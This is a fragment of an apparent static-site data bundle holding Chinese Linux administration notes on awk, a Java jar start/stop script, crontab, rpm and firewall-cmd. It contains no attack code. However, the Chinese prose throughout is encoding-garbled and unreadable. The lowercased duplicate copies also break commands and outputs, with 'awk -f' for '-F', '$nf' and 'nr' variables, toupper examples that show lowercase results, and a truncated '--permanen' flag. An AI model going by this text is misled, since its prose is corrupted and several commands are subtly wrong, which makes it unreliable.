åè¾åº(stdout)æ¯1 2> åé¢å¯ä»¥è·æä»¶åï¼æèæ¯&1, &2ï¼åå«è¡¨ç¤ºéå®åå°æ åè¾åºåæ åéè¯¯ã\n    nohup java -jar $APP_NAME > logs/$LOG_NAME 2>&1 &\n    # å»¶è¿ 1s 1ç§ 1m 1åé 1h 1å°æ¶ 1d 1å¤©\n    sleep 1s;\n    tail -f logs/$LOG_NAME\n}\n\n\n\n# åæ­¢è¿è¡\nstop(){\n    is_exist\n    if [ $? -eq 0 ]; then\n        echo "$APP_NAME is running "\n        kill -9 $pid\n        echo "$APP_NAME is kill ok. pid is $pid"\n    else\n        echo "${APP_NAME} is not running"\n    fi\n}\n\n# å¤æ­åæ°1æ¯å¦ä¸ºç©ºï¼ä¸ºç©ºååè¯æ ååæ³ï¼ä¸ä¸ºç©ºåæåæ°å½æ¹æ³æ§è¡\nif [ ! $1 ]; then\n    echo "run method  $0 start | stop  app_name.jar"\n    exit\nelse\n    $1\nfi\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n\n\n> ç¼å shell èæ¬ï¼å½æ°ä¸å®è¦å¨æä¸é¢ï¼å¦åè°ç¨å½æ°ä¼æ¥ command not found',normalizedContent:'awk å½ä»¤æ¯éè¡æ«ææä»¶ï¼ä»ç¬¬ 1 è¡å°æåä¸è¡ï¼ï¼å¯»æ¾å«æç®æ ææ¬çè¡ï¼å¦æå¹éæåï¼åä¼å¨è¯¥è¡ä¸æ§è¡ç¨æ·æ³è¦çæä½ï¼åä¹ï¼åä¸å¯¹è¡åä»»ä½å¤çã\n\n\n# fï¼æå®å­æ®µåéç¬¦ï¼\n\né»è®¤ä½¿ç¨ç©ºæ ¼ä½ä¸ºåéç¬¦ã\n\n[root@localhost awk]# echo "aa bb  cc dd  ee ff" | awk  \'{print $1}\'\naa\n[root@localhost awk]# echo "aa bb l cc dd l ee ff" | awk -f \'l\' \'{print $1}\'\naa bb \n[root@localhost awk]# echo "aa bb  cc : dd  ee ff" | awk -f \':\' \'{print $1}\'\naa bb  cc \n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# fsï¼å­æ®µåéç¬¦ï¼\n\né»è®¤æ¯ç©ºæ ¼åå¶è¡¨ç¬¦ã\n$0 è¡¨ç¤ºå½åæ´è¡åå®¹ï¼$1ï¼$2 è¡¨ç¤ºç¬¬ä¸ä¸ªå­æ®µï¼ç¬¬äºä¸ªå­æ®µ\n\n[root@localhost zabbix_agentd.d]# echo "aa bb cc  dd" | awk \'{ print $0}\'\naa bb cc  dd\n[root@localhost zabbix_agentd.d]# echo "aa bb cc  dd" | awk \'{ print $1}\'\naa\n[root@localhost zabbix_agentd.d]# echo "aa bb cc  dd" | awk \'{ print $2}\'\nbb\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# nfï¼å½åè¡çå­æ®µä¸ªæ°ï¼\n\nå°±ä»£è¡¨æåä¸ä¸ªå­æ®µï¼(nf-1) ä»£è¡¨åæ°ç¬¬äºä¸ªå­æ®µ\n\n[root@localhost zabbix_agentd.d]# echo "aa bb cc  dd" | awk \'{ print $nf}\'\ndd\n[root@localhost zabbix_agentd.d]# echo "aa bb cc  dd" | awk \'{ print $(nf-1)}\'\ncc\n\n\n1\n2\n3\n4\n\n\n\n# nr (å½åå¤ççæ¯ç¬¬å è¡)\n\næå°å½åè¡å·åå½åææ¬åå®¹\n\n[root@localhost awk]# cat test.txt \naa ss\ndd ff\ngg hh\n[root@localhost awk]# cat test.txt | awk \'{print nr")", $0}\'\n1) aa ss\n2) dd ff\n3) gg hh\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\néå·è¡¨ç¤ºè¾åºçåéä¹é´ç¨ç©ºæ ¼åéï¼\nå³æ¬å·å¿éä½¿ç¨ åå¼å· æå¯ä»¥åæ ·è¾åº\næå°æå®è¡åå®¹ï¼\n\n[root@localhost s17]# java -version \njava version "1.8.0_131"\njava(tm) se runtime environment (build 1.8.0_131-b11)\njava hotspot(tm) 64-bit server vm (build 25.131-b11, mixed mode)\n[root@localhost s17]# java -version 2>&1  | awk \'nr==1 {print $0}\'\njava version "1.8.0_131"\n[root@localhost s17]# \n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# filename (å½åæä»¶å)\n\n[root@localhost awk]#  awk \'{print filename, nr")", $0}\' test.txt \ntest.txt 1) aa ss\ntest.txt 2) dd ff\ntest.txt 3) gg hh\n[root@localhost awk]# cat test.txt | awk \'{print filename, nr")", $0}\'\n- 1) aa ss\n- 2) dd ff\n- 3) gg hh\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nawk \'{condition action}\' filename è¿ç§å½¢å¼æ¶å¯ä»¥æå°æä»¶åï¼\néè¿ |ï¼ç®¡éç¬¦ï¼è¯»ååå®¹æ¶æå°çæ¯ -\n\n\n# å¶ä»åé\n\nrsï¼è¡åéç¬¦ï¼ç¨äºåå²æ¯ä¸è¡ï¼é»è®¤æ¯æ¢è¡ç¬¦ã\nofsï¼è¾åºå­æ®µçåéç¬¦ï¼ç¨äºæå°æ¶åéå­æ®µï¼é»è®¤ä¸ºç©ºæ ¼ã\norsï¼è¾åºè®°å½çåéç¬¦ï¼ç¨äºæå°æ¶åéè®°å½ï¼é»è®¤ä¸ºæ¢è¡ç¬¦ã\nofmtï¼æ°å­è¾åºçæ ¼å¼ï¼é»è®¤ä¸ºï¼.6gã\n\n\n# print å printf\n\nawk ä¸­åæ¶æä¾äº print å printf ä¸¤ç§æå°è¾åºçå½æ°ã\n\nprint å½æ°ï¼åæ°å¯ä»¥æ¯åéãæ°å¼æèå­ç¬¦ä¸²ãå­ç¬¦ä¸²å¿é¡»ç¨åå¼å·å¼ç¨ï¼åæ°ç¨éå·åéãå¦ææ²¡æéå·ï¼åæ°å°±ä¸²èå¨ä¸èµ·èæ æ³åºåãè¿éï¼éå·çä½ç¨ä¸è¾åºæä»¶çåéç¬¦çä½ç¨æ¯ä¸æ ·çï¼åªæ¯åèæ¯ç©ºæ ¼èå·²ã\n\nprintf å½æ°ï¼å¶ç¨æ³å c è¯­è¨ä¸­ printf åºæ¬ç¸ä¼¼ï¼å¯ä»¥æ ¼å¼åå­ç¬¦ä¸²ï¼è¾åºå¤ææ¶ï¼printf æ´å å¥½ç¨ï¼ä»£ç æ´ææã\n\n\n# å¶ä»å½æ°\n\ntoupper ()ï¼å­ç¬¦è½¬ä¸ºå¤§åã\ntolower ()ï¼å­ç¬¦è½¬ä¸ºå°åã\nlength ()ï¼è¿åå­ç¬¦ä¸²é¿åº¦ã\nsubstr ()ï¼è¿åå­å­ç¬¦ä¸²ã\nsubstr ($1,2)ï¼è¿åç¬¬ä¸ä¸ªå­æ®µï¼ä»ç¬¬ 2 ä¸ªå­ç¬¦å¼å§ä¸ç´å°ç»æã\nsubstr ($1,2,3)ï¼è¿åç¬¬ä¸ä¸ªå­æ®µï¼ä»ç¬¬ 2 ä¸ªå­ç¬¦å¼å§å¼å§åç 3 ä¸ªå­ç¬¦ã\nsin ()ï¼æ­£å¼¦ã\ncos ()ï¼ä½å¼¦ã\nsqrt ()ï¼å¹³æ¹æ ¹ã\nrand ()ï¼éæºæ°ã\n\n[root@localhost awk]# echo "aa bb  cc dd  ee ff" | awk  \'{print toupper($1)}\'\naa\n[root@localhost awk]# echo "aa bb  cc dd  ee ff" | awk  \'{print tolower($2)}\'\nbb\n[root@localhost awk]# echo "aa bb  cc dd  ee ff" | awk  \'{print length($2)}\'\n2\n[root@localhost awk]# echo "asdfghj" | awk \'{print substr($1,2,3)}\'\nsdf\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# æ¡ä»¶\n\nawk åè®¸æå®è¾åºæ¡ä»¶ï¼åªè¾åºç¬¦åæ¡ä»¶çè¡ã\nawk \' æ¡ä»¶ {å¨ä½}\' æä»¶å\n\n[root@localhost awk]# cat exp.txt \n/stsvc/fms/conf/application.yml\n/stsvc/sms/conf/application.yml\n/stsvc/tms/conf/application.yml\n/root/home/chenfan\n/root/home/jhhuang\n[root@localhost awk]# cat exp.txt | awk \'/stsvc/ {print $0}\'     åå« stsvc çè¡\n/stsvc/fms/conf/application.yml\n/stsvc/sms/conf/application.yml\n/stsvc/tms/conf/application.yml\n[root@localhost awk]# cat exp.txt | awk \'/stsvc\\/fms/ {print $0}\' åå« stsvc/fms çè¡\n/stsvc/fms/conf/application.yml\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nå¸å°å¼å¤æ­\n\n[root@localhost awk]# cat exp.txt | awk \'nr==2 {print $0}\'ããç­äºç¬¬äºè¡\n/stsvc/sms/conf/application.yml\n[root@localhost awk]# cat exp.txt | awk \'nr>4 {print $0}\'ããå¤§äºç¬¬åè¡\n/root/home/jhhuang\n[root@localhost awk]# cat exp.txt | awk \'nr%2==1 {print $0}\'ããå¥æ°è¡\n/stsvc/fms/conf/application.yml\n/stsvc/tms/conf/application.yml\n/root/home/jhhuang\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\næä¸ªå­æ®µç­äºå·ä½å¼\n\n[root@localhost awk]# cat test.txt \naa ss\ndd ff\ngg hh\n[root@localhost awk]# cat test.txt | awk \' $2=="ff" {print $0}\'\ndd ff\n\n\n1\n2\n3\n4\n5\n6\n\n\nif è¯­å¥\n\n[root@localhost awk]# echo "aa ss dd" | awk \'{ if($3 == "dd") print $0; else print "nothing"}\'\naa ss dd\n[root@localhost awk]# echo "aa ss dds" | awk \'{ if($3 == "dd") print $0; else print "nothing"}\'\nnothing\n\n\n1\n2\n3\n4\n\n\n\n# demo\n\nä»¥ä¸èæ¬å¤å¶ç²è´´å°±å¯ç¨ï¼éè¦å¨ååºç¨åçº§ç®å½æ°å»ºä¸ä¸ª logs æä»¶å¤¹ï¼ä½¿ç¨æ¹æ³ ./ èæ¬.sh start åºç¨åç§°.jarï¼å¶ä¸­ä½¿ç¨äº awk å½ä»¤è§£å³è·å pid é®é¢\n\n#/bin/bash\n\n# è¿éè¯´ä¸ä¸ æç¨ /bin/sh èæ¬éæå°éæ­£å¸¸ æ¢æ /bin/bash å°±å¥½äº\n# éè¿æ§è¡æä»¶è·å¾ è¦è¢«æ§è¡çjar ä¾å¦ ./start.sh test-0.0.1.jar è·åå° test-0.0.1.jar\n# $@è·å¾ææåæ°,$1è·å¾ç¬¬ä¸ä¸ªåæ°\nmathod=$1\napp_name=$2\n# å¨æ¹æ³åç´æ¥ä½¿ç¨æ¯æ æ³è·åå°ä¸ªæ°ç\nparam=$#\n\n# åæ°æ ¡éª\ncheck(){\n    if [ $param -ne 2 ]; then\n        echo "run method  $0 start | stop  app_name.jar"\n        exit\n    fi\n}\n\n\n# å¤æ­ç¨åºæ¯å¦è¿è¡ å¦æä¸å­å¨è¿å1ï¼å­å¨è¿å0\nis_exist(){\n    check\n    # grep -v grep å°±æ¯æ¥æ¾ä¸å«æ grep å­æ®µçè¡ï¼é»è®¤ç¬¬ä¸æ¡å½ä»¤ä¼æ¥åºä¸¤è¡æ°æ®ï¼ç¬¬ä¸è¡ä¸è¬æ¯æä»¬æéè¦çï¼ç¬¬äºè¡å°±å±äº grepçæ°æ®\n    # grep æ¯æ¥æ¾å«ææå®ææ¬è¡çææï¼æ¯å¦grep test å°±æ¯æ¥æ¾å«ætestçææ¬çè¡\n    # grep -v æ¯ååæ¥æ¾çææï¼æ¯å¦ grep -v grep å°±æ¯æ¥æ¾ä¸å«æ grep å­æ®µçè¡\n    # $(ps -ef | grep $jarname | grep -v grep) æ¯æ§è¡ä¸ä¸ªå½ä»¤ï¼å¹¶æç»æèµç»pid\n    # awk ç¾åº¦\n    pid=`ps -ef | grep $app_name | grep -v grep | awk \'{print $2}\'`\n    # [ -z string ] âstringâ çé¿åº¦ä¸ºé¶åä¸ºçã\n    if [ -z "$pid" ]; then\n        return 1\n    else\n        return 0\n    fi\n}\n\n#å¯å¨æ¹æ³\nstart(){\n    is_exist\n    # %%-* è¡¨ç¤ºä»å³è¾¹å¼å§ï¼å é¤æåï¼æå·¦è¾¹ï¼ç - å·åå³è¾¹çå¤æå­ç¬¦\n    log_name="${app_name%%-*}.log"\n    # $? æ¯ä¸ä¸ªç¹æ®åéï¼ç¨æ¥è·åä¸ä¸ä¸ªå½ä»¤çéåºç¶æï¼æèä¸ä¸ä¸ªå½æ°çè¿åå¼ã\n    # -eq ç­äº\n    if [ $? -eq 0 ]; then\n        stop\n        start_app\n    else\n        start_app\n    fi\n}\n\nstart_app(){\n    echo "$app_name start..."\n    # 2> è¡¨ç¤ºææ åéè¯¯(stderr)éå®åï¼æ åè¾åº(stdout)æ¯1 2> åé¢å¯ä»¥è·æä»¶åï¼æèæ¯&1, &2ï¼åå«è¡¨ç¤ºéå®åå°æ åè¾åºåæ åéè¯¯ã\n    nohup java -jar $app_name > logs/$log_name 2>&1 &\n    # å»¶è¿ 1s 1ç§ 1m 1åé 1h 1å°æ¶ 1d 1å¤©\n    sleep 1s;\n    tail -f logs/$log_name\n}\n\n\n\n# åæ­¢è¿è¡\nstop(){\n    is_exist\n    if [ $? -eq 0 ]; then\n        echo "$app_name is running "\n        kill -9 $pid\n        echo "$app_name is kill ok. pid is $pid"\n    else\n        echo "${app_name} is not running"\n    fi\n}\n\n# å¤æ­åæ°1æ¯å¦ä¸ºç©ºï¼ä¸ºç©ºååè¯æ ååæ³ï¼ä¸ä¸ºç©ºåæåæ°å½æ¹æ³æ§è¡\nif [ ! $1 ]; then\n    echo "run method  $0 start | stop  app_name.jar"\n    exit\nelse\n    $1\nfi\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n\n\n> ç¼å shell èæ¬ï¼å½æ°ä¸å®è¦å¨æä¸é¢ï¼å¦åè°ç¨å½æ°ä¼æ¥ command not found',charsets:{cjk:!0}},{title:"Linux å®æ¶ä»»å¡",frontmatter:{title:"Linux å®æ¶ä»»å¡",date:"2023-06-25T09:22:36.000Z",permalink:"/linux/2303",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/2300.linux/2303.Linux%20%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1.html",relativePath:"01.è¿ç»´/2300.linux/2303.Linux å®æ¶ä»»å¡.md",key:"v-252f5a65",path:"/linux/2303/",lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:null,content:"crontab å½ä»¤ è¢«ç¨æ¥æäº¤åç®¡çç¨æ·çéè¦å¨ææ§æ§è¡çä»»å¡ï¼ä¸ windows ä¸çè®¡åä»»å¡ç±»ä¼¼ï¼å½å®è£å®ææä½ç³»ç»åï¼é»è®¤ä¼å®è£æ­¤æå¡å·¥å·ï¼å¹¶ä¸ä¼èªå¨å¯å¨ crond è¿ç¨ï¼crond è¿ç¨æ¯åéä¼å®ææ£æ¥æ¯å¦æè¦æ§è¡çä»»å¡ï¼å¦ææè¦æ§è¡çä»»å¡ï¼åèªå¨æ§è¡è¯¥ä»»å¡ã\n\ncrontab -e : ä¿®æ¹ crontab æä»¶. å¦ææä»¶ä¸å­å¨ä¼èªå¨åå»ºã \ncrontab -l : æ¾ç¤º crontab æä»¶ã \ncrontab -r : å é¤ crontab æä»¶ã\ncrontab -ir : å é¤ crontab æä»¶åæéç¨æ·ã\n\n\n1\n2\n3\n4\n\n\n{minute} {hour} {day-of-month} {month} {day-of-week} {full-path-to-shell-script} \no minute: åºé´ä¸º 0 â 59 \no hour: åºé´ä¸º0 â 23 \no day-of-month: åºé´ä¸º0 â 31 \no month: åºé´ä¸º1 â 12. 1 æ¯1æ. 12æ¯12æ. \no Day-of-week: åºé´ä¸º0 â 7. å¨æ¥å¯ä»¥æ¯0æ7.\n\n1ãå¨ åæ¨00:01è¿è¡\n1 0 * * * /home/linrui/XXXX.sh\n2ãæ¯ä¸ªå·¥ä½æ¥23:59é½è¿è¡å¤ä»½ä½ä¸ã\n59 11 * * 1-5 /home/linrui/XXXX.sh\n3ãæ¯åéè¿è¡ä¸æ¬¡å½ä»¤\n*/1 * * * * /home/linrui/XXXX.sh\n4ãæ¯ä¸ªæç1å· 14:10 è¿è¡\n10 14 1 * * /home/linrui/XXXX.sh\n\næå·ï¼*ï¼ï¼ä»£è¡¨ææå¯è½çå¼ï¼ä¾å¦monthå­æ®µå¦ææ¯æå·ï¼åè¡¨ç¤ºå¨æ»¡è¶³å¶å®å­æ®µçå¶çº¦æ¡ä»¶åæ¯æé½æ§è¡è¯¥å½ä»¤æä½ã\n éå·ï¼,ï¼ï¼å¯ä»¥ç¨éå·éå¼çå¼æå®ä¸ä¸ªåè¡¨èå´ï¼ä¾å¦ï¼â1,2,5,7,8,9â\nä¸­æ ï¼-ï¼ï¼å¯ä»¥ç¨æ´æ°ä¹é´çä¸­æ è¡¨ç¤ºä¸ä¸ªæ´æ°èå´ï¼ä¾å¦â2-6âè¡¨ç¤ºâ2,3,4,5,6â\næ­£æçº¿ï¼/ï¼ï¼å¯ä»¥ç¨æ­£æçº¿æå®æ¶é´çé´éé¢çï¼ä¾å¦â0-23/2âè¡¨ç¤ºæ¯ä¸¤å°æ¶æ§è¡ä¸æ¬¡ã\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\nä¹å¯ä»¥è¿å¥ vim /etc/crontab (Linux ç³»ç»ä¸­ç¨äºéç½® cron ä»»å¡çæä»¶) ç´æ¥æä½æä»¶",normalizedContent:"crontab å½ä»¤ è¢«ç¨æ¥æäº¤åç®¡çç¨æ·çéè¦å¨ææ§æ§è¡çä»»å¡ï¼ä¸ windows ä¸çè®¡åä»»å¡ç±»ä¼¼ï¼å½å®è£å®ææä½ç³»ç»åï¼é»è®¤ä¼å®è£æ­¤æå¡å·¥å·ï¼å¹¶ä¸ä¼èªå¨å¯å¨ crond è¿ç¨ï¼crond è¿ç¨æ¯åéä¼å®ææ£æ¥æ¯å¦æè¦æ§è¡çä»»å¡ï¼å¦ææè¦æ§è¡çä»»å¡ï¼åèªå¨æ§è¡è¯¥ä»»å¡ã\n\ncrontab -e : ä¿®æ¹ crontab æä»¶. å¦ææä»¶ä¸å­å¨ä¼èªå¨åå»ºã \ncrontab -l : æ¾ç¤º crontab æä»¶ã \ncrontab -r : å é¤ crontab æä»¶ã\ncrontab -ir : å é¤ crontab æä»¶åæéç¨æ·ã\n\n\n1\n2\n3\n4\n\n\n{minute} {hour} {day-of-month} {month} {day-of-week} {full-path-to-shell-script} \no minute: åºé´ä¸º 0 â 59 \no hour: åºé´ä¸º0 â 23 \no day-of-month: åºé´ä¸º0 â 31 \no month: åºé´ä¸º1 â 12. 1 æ¯1æ. 12æ¯12æ. \no day-of-week: åºé´ä¸º0 â 7. å¨æ¥å¯ä»¥æ¯0æ7.\n\n1ãå¨ åæ¨00:01è¿è¡\n1 0 * * * /home/linrui/xxxx.sh\n2ãæ¯ä¸ªå·¥ä½æ¥23:59é½è¿è¡å¤ä»½ä½ä¸ã\n59 11 * * 1-5 /home/linrui/xxxx.sh\n3ãæ¯åéè¿è¡ä¸æ¬¡å½ä»¤\n*/1 * * * * /home/linrui/xxxx.sh\n4ãæ¯ä¸ªæç1å· 14:10 è¿è¡\n10 14 1 * * /home/linrui/xxxx.sh\n\næå·ï¼*ï¼ï¼ä»£è¡¨ææå¯è½çå¼ï¼ä¾å¦monthå­æ®µå¦ææ¯æå·ï¼åè¡¨ç¤ºå¨æ»¡è¶³å¶å®å­æ®µçå¶çº¦æ¡ä»¶åæ¯æé½æ§è¡è¯¥å½ä»¤æä½ã\n éå·ï¼,ï¼ï¼å¯ä»¥ç¨éå·éå¼çå¼æå®ä¸ä¸ªåè¡¨èå´ï¼ä¾å¦ï¼â1,2,5,7,8,9â\nä¸­æ ï¼-ï¼ï¼å¯ä»¥ç¨æ´æ°ä¹é´çä¸­æ è¡¨ç¤ºä¸ä¸ªæ´æ°èå´ï¼ä¾å¦â2-6âè¡¨ç¤ºâ2,3,4,5,6â\næ­£æçº¿ï¼/ï¼ï¼å¯ä»¥ç¨æ­£æçº¿æå®æ¶é´çé´éé¢çï¼ä¾å¦â0-23/2âè¡¨ç¤ºæ¯ä¸¤å°æ¶æ§è¡ä¸æ¬¡ã\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\nä¹å¯ä»¥è¿å¥ vim /etc/crontab (linux ç³»ç»ä¸­ç¨äºéç½® cron ä»»å¡çæä»¶) ç´æ¥æä½æä»¶",charsets:{cjk:!0}},{title:"Linux å½ä»¤æ»ç»",frontmatter:{title:"Linux å½ä»¤æ»ç»",date:"2023-06-25T09:22:36.000Z",permalink:"/linux/2304",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/2300.linux/2304.Linux%20%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93.html",relativePath:"01.è¿ç»´/2300.linux/2304.Linux å½ä»¤æ»ç».md",key:"v-8da11b2c",path:"/linux/2304/",headers:[{level:2,title:"rpm",slug:"rpm",normalizedTitle:"rpm",charIndex:2},{level:2,title:"firewall",slug:"firewall",normalizedTitle:"firewall",charIndex:330}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"rpm firewall",content:'# rpm\n\nå¨ Linux ç³»ç»ä¸­ï¼RPMï¼Red Hat Package Managerï¼æ¯ä¸ç§å¸¸è§çè½¯ä»¶åç®¡çå¨ï¼æä¾äºæ¹ä¾¿çè½¯ä»¶å®è£ãåçº§åå¸è½½åè½ãæ¬æå°è¯¦ç»ä»ç» rpm çè¯­æ³ãå®æååç§æ¹æ³ä¹é´çåºå«åéç¹åå®¹ã\n\n# å®è£\nrpm -ivh xxx.rpm\n\n# å¯ä»¥æ¥è¯¢å°rpmåçåå­\nrpm -q <å³é®å­>\n\n# å é¤ç¹å®rpmå\nrpm -e <åçåå­>\n\n# ä¸æ£æ¥ä¾èµï¼ç´æ¥å é¤rpmå\nrpm -e --nodeps <åçåå­>\n\n# å é¤ææç¸ååå­çåï¼ å¹¶å¿½ç¥ä¾èµ\nrpm -e --allmatches --nodeps <åçåå­>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# firewall\n\nfirewall æ¯ CentOS 7 çæ¬åçèªå¸¦é²ç«å¢ç®¡çå·¥å·ï¼ä¸ iptables ä¸åï¼firewall æ¯ä¸æ¬¾å¨æé²ç«å¢ç®¡çå·¥å·ãæè°å¨æé²ç«å¢ï¼æ¯æ firewall å¨è¿è¡æ¶ï¼ä»»ä½è§åçåæ´é½ä¸éè¦å¯¹é²ç«å¢è§ååè¡¨è¿è¡éæ°å è½½ï¼åªéè¦å°åæ´é¨åä¿å­å¹¶æ´æ°è¿è¡å³å¯ãç¸å¯¹åºçï¼å½ç¨æ·ä½¿ç¨ iptables æ·»å è§åæ¶ï¼å¦ææ³è¦è®©è§åæ°¸ä¹ä¿å­ï¼éè¦æ§è¡å½ä»¤ serivce iptables saveï¼æ³¨ï¼è¯¥å½ä»¤çæ§è¡éè¦å®è£ iptables.serivcesï¼ï¼æå¯ä»¥æ°¸ä¹ä¿å­ç½®éç½®æä»¶ä¸­ï¼å¹¶ä¸å¨éå¯åï¼éç½®ä¾æ§å­å¨ãå¨æ´ä¸ªè¿ç¨ä¸­ï¼iptables ä¼å¯¹é²ç«å¢çè§ååè¡¨éè¯»ä¸éï¼å è½½å°åæ ¸ã\n\næ·»å èå´ç«¯å£ å¦ 5000-10000ï¼\n\nfirewall-cmd --zone=public --add-port=5000-10000/tcp --permanent \n\n\n1\n\n\néæ°è½½å¥\n\nfirewall-cmd --reload\n\n\n1\n\n\næ¥ç\n\nfirewall-cmd --zone=public --query-port=80/tcp\n\n\n1\n\n\nå é¤\n\nfirewall-cmd --zone=public --remove-port=80/tcp --permanent\n\n\n1\n\n\n# ä½å¦æä½ éè¦å¼å¯ firewalldï¼é£ä¹è¯·æ¥çå¦ä¸éç½®\n# åè®¸22ç«¯å£è®¿é®\nfirewall-cmd --zone=public --add-port=22/tcp --permanen\n# éæ°è½½å¥ä¸ä¸é²ç«å¢è®¾ç½®ï¼ä½¿è®¾ç½®çæ\nfirewall-cmd --reload\n# å¯éè¿å¦ä¸å½ä»¤æ¥çæ¯å¦çæ\nfirewall-cmd --zone=public --query-port=22/tcp\n# æ¥çå½åç³»ç»æå¼çææç«¯å£\nfirewall-cmd --zone=public --list-ports\n# å³æååæå¼ç22ç«¯å£\nfirewall-cmd --zone=public --remove-port=22/tcp --permanent\n# æ¹éå¼æ¾ç«¯å£ï¼å¦ä»100å°500è¿ä¹é´çç«¯å£æä»¬å¨é¨è¦æå¼\nfirewall-cmd --zone=public --add-port=100-500/tcp --permanent\n# éå¶IPä¸º192.168.0.200çå°åç¦æ­¢è®¿é®80ç«¯å£å³ç¦æ­¢è®¿é®æºå¨\nfirewall-cmd --permanent --add-rich-rule="rule family="ipv4" source address="192.168.0.200" port protocol="tcp" port="80" reject"\n# è§£é¤åæè¢«éå¶ç192.168.0.200\nfirewall-cmd --permanent --add-rich-rule="rule family="ipv4" source address="192.168.0.200" port protocol="tcp" port="80" accept"\n# éå¶10.0.0.0-10.0.0.255è¿ä¸æ´ä¸ªæ®µçIPï¼ç¦æ­¢ä»ä»¬è®¿é®\nfirewall-cmd --permanent --add-rich-rule="rule family="ipv4" source address="10.0.0.0/24" port protocol="tcp" port="80" reject"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n',normalizedContent:'# rpm\n\nå¨ linux ç³»ç»ä¸­ï¼rpmï¼red hat package managerï¼æ¯ä¸ç§å¸¸è§çè½¯ä»¶åç®¡çå¨ï¼æä¾äºæ¹ä¾¿çè½¯ä»¶å®è£ãåçº§åå¸è½½åè½ãæ¬æå°è¯¦ç»ä»ç» rpm çè¯­æ³ãå®æååç§æ¹æ³ä¹é´çåºå«åéç¹åå®¹ã\n\n# å®è£\nrpm -ivh xxx.rpm\n\n# å¯ä»¥æ¥è¯¢å°rpmåçåå­\nrpm -q <å³é®å­>\n\n# å é¤ç¹å®rpmå\nrpm -e <åçåå­>\n\n# ä¸æ£æ¥ä¾èµï¼ç´æ¥å é¤rpmå\nrpm -e --nodeps <åçåå­>\n\n# å é¤ææç¸ååå­çåï¼ å¹¶å¿½ç¥ä¾èµ\nrpm -e --allmatches --nodeps <åçåå­>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# firewall\n\nfirewall æ¯ centos 7 çæ¬åçèªå¸¦é²ç«å¢ç®¡çå·¥å·ï¼ä¸ iptables ä¸åï¼firewall æ¯ä¸æ¬¾å¨æé²ç«å¢ç®¡çå·¥å·ãæè°å¨æé²ç«å¢ï¼æ¯æ firewall å¨è¿è¡æ¶ï¼ä»»ä½è§åçåæ´é½ä¸éè¦å¯¹é²ç«å¢è§ååè¡¨è¿è¡éæ°å è½½ï¼åªéè¦å°åæ´é¨åä¿å­å¹¶æ´æ°è¿è¡å³å¯ãç¸å¯¹åºçï¼å½ç¨æ·ä½¿ç¨ iptables æ·»å è§åæ¶ï¼å¦ææ³è¦è®©è§åæ°¸ä¹ä¿å­ï¼éè¦æ§è¡å½ä»¤ serivce iptables saveï¼æ³¨ï¼è¯¥å½ä»¤çæ§è¡éè¦å®è£ iptables.serivcesï¼ï¼æå¯ä»¥æ°¸ä¹ä¿å­ç½®éç½®æä»¶ä¸­ï¼å¹¶ä¸å¨éå¯åï¼éç½®ä¾æ§å­å¨ãå¨æ´ä¸ªè¿ç¨ä¸­ï¼iptables ä¼å¯¹é²ç«å¢çè§ååè¡¨éè¯»ä¸éï¼å è½½å°åæ ¸ã\n\næ·»å èå´ç«¯å£ å¦ 5000-10000ï¼\n\nfirewall-cmd --zone=public --add-port=5000-10000/tcp --permanent \n\n\n1\n\n\néæ°è½½å¥\n\nfirewall-cmd --reload\n\n\n1\n\n\næ¥ç\n\nfirewall-cmd --zone=public --query-port=80/tcp\n\n\n1\n\n\nå é¤\n\nfirewall-cmd --zone=public --remove-port=80/tcp --permanent\n\n\n1\n\n\n# ä½å¦æä½ éè¦å¼å¯ firewalldï¼é£ä¹è¯·æ¥çå¦ä¸éç½®\n# åè®¸22ç«¯å£è®¿é®\nfirewall-cmd --zone=public --add-port=22/tcp --permanen\n# éæ°è½½å¥ä¸ä¸é²ç«å¢è®¾ç½®ï¼ä½¿è®¾ç½®çæ\nfirewall-cmd --reload\n# å¯éè¿å¦ä¸å½ä»¤æ¥çæ¯å¦çæ\nfirewall-cmd --zone=public --query-port=22/tcp\n# æ¥çå½åç³»ç»æå¼çææç«¯å£\nfirewall-cmd 